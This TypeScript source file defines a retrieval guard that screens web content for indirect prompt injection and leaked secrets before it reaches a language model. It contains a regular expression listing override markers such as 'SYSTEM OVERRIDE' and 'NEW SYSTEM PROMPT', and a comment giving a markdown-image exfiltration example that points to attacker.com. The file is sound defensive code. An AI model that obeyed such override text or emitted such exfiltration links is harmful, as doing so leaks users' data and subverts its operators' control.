/**
 * Retrieval Guard
 * Inspects retrieved web content, search results, and knowledge documents
 * before they are placed into LLM context.
 * Strips indirect prompt injections, adversarial instructions, and secrets.
 */

import { promptInjectionDetector } from './prompt-injection.ts';
import { secretScanner } from './secrets.ts';

export interface RetrievalGuardResult {
  safeText: string;
  isPoisoned: boolean;
  warnings: string[];
}

export class RetrievalGuard {
  public sanitize(content: string, source: string): RetrievalGuardResult {
    if (!content || typeof content !== 'string') {
      return { safeText: '', isPoisoned: false, warnings: [] };
    }

    const warnings: string[] = [];
    let isPoisoned = false;

    // 1. Check for indirect prompt injection
    const injection = promptInjectionDetector.detect(content);
    if (injection.isInjection) {
      isPoisoned = true;
      warnings.push(`Untrusted retrieval source [${source}] contained prompt injection attempt (${injection.category})`);
    }

    // 2. Strip secret leaks from web documents
    const secrets = secretScanner.scan(content);
    let safeText = secrets.sanitizedText;

    // 3. Neutralize common instruction-hijacking markers in retrieved text
    safeText = safeText.replace(
      /(?:IMPORTANT\s+AI\s+INSTRUCTION|SYSTEM\s+OVERRIDE|ADMIN\s+DIRECTIVE|NEW\s+SYSTEM\s+PROMPT):[\s\S]*?(?:\n\n|$)/gi,
      '[UNTRUSTED_CONTENT_FILTERED: Potential Indirect Injection]\n\n'
    );

    // 4. Neutralize markdown image exfiltration (e.g. ![leak](https://attacker.com/leak?data=...))
    safeText = safeText.replace(/!\[.*?\]\((?:https?:\/\/[^\s)]+)\)/gi, '[FILTERED_EXTERNAL_MEDIA]');

    return {
      safeText,
      isPoisoned,
      warnings,
    };
  }
}

export const retrievalGuard = new RetrievalGuard();
